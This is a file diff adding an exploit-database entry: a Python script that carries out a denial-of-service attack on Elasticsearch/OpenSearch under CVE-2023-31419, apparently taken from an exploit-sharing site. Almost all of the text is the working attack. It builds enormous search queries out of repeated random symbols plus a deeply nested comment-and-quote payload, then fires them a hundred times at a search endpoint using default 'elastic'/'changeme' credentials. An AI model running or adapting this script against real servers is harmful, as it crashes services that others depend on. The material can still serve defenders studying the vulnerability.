@@ -1,0 +1,62 @@
+id: 39315
+date: 02/11/2024
+title: Elasticsearch - StackOverflow DoS Exploit
+author: Touhami Kasbaoui
+cves: CVE-2023-31419
+
+# Exploit Author: TOUHAMI KASBAOUI
+# Vendor Homepage: https://elastic.co/
+# Version: 8.5.3 / OpenSearch
+# Tested on: Ubuntu 20.04 LTS
+# CVE : CVE-2023-31419
+# Ref: https://github.com/sqrtZeroKnowledge/Elasticsearch-Exploit-CVE-2023-31419
+
+import requests
+import random
+import string
+
+es_url = 'http://localhost:9200'  # Replace with your Elasticsearch server URL
+index_name = '*'
+
+payload = "/*" * 10000 + "\\" +"'" * 999
+
+verify_ssl = False
+
+username = 'elastic'
+password = 'changeme'
+
+auth = (username, password)
+
+num_queries = 100
+
+for _ in range(num_queries):
+    symbols = ''.join(random.choice(string.ascii_letters + string.digits + '^') for _ in range(5000))
+    search_query = {
+        "query": {
+            "match": {
+                "message": (symbols * 9000) + payload
+            }
+        }
+    }
+
+    print(f"Query {_ + 1} - Search Query:")
+
+    search_endpoint = f'{es_url}/{index_name}/_search'
+    response = requests.get(search_endpoint, json=search_query, verify=verify_ssl, auth=auth)
+
+    if response.status_code == 200:
+        search_results = response.json()
+
+        print(f"Query {_ + 1} - Response:")
+        print(search_results)
+
+        total_hits = search_results['hits']['total']['value']
+        print(f"Query {_ + 1}: Total hits: {total_hits}")
+
+        for hit in search_results['hits']['hits']:
+            source_data = hit['_source']
+            print("Payload result: {search_results}")
+    else:
+        print(f"Error for query {_ + 1}: {response.status_code} - {response.text}")
+
+#  0day.today [2024-02-12]  #
